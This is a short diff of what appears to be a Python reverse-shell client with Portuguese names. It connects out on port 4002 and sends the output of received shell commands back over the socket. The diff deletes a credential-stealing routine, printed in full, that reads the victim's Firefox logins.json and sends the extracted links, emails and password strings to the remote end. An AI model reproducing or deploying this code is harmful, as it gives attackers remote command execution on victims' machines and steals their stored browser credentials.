@@ -10,26 +10,8 @@ port = 4002
 
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-def senhas(s):
-	try:
-		getuserprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')
-		usr = userprof[1].strip('\r\n')
-		f = open('C:\\Users\\'+usr+'\\AppData\\Roaming\\Mozilla\\Firefox\Profiles\\a25ik1y6.default\\logins.json')
-		text = f.read()
-		links = re.findall(r'(https?:\/\/[^"\'>]*)', text)
-		emails = re.findall(r'[\w\._-]+@[\w\_-]+\.[\w\._-]+\w', text)
-		passwords = re.findall(r'[A-Z][\w.]+[\w.]+[\w.]+===?', text)
-		for link in links:
-			s.send("[==>] Link %s" %(link))
-		s.send('\n')
-		for password in passwords:
-			s.send("[==>] Pass: %s" %(password))
-		s.send('\n')
-		for email in emails:
-			s.send("[==>] Emails: %s" %(email))
-	except:
-		s.send("Falha ao pegar senhas")
 
 def conectar(ip, port):
 	try:
@@ -47,7 +29,6 @@ def shell(s):
 			saida = proc.stdout.read() + proc.stderr.read()
 			s.send("%s\n" %(saida))
 			s.send("Pegando Senhas...")
-			senhas(s)
 			s.send("CMD: ")
 			
 		except:
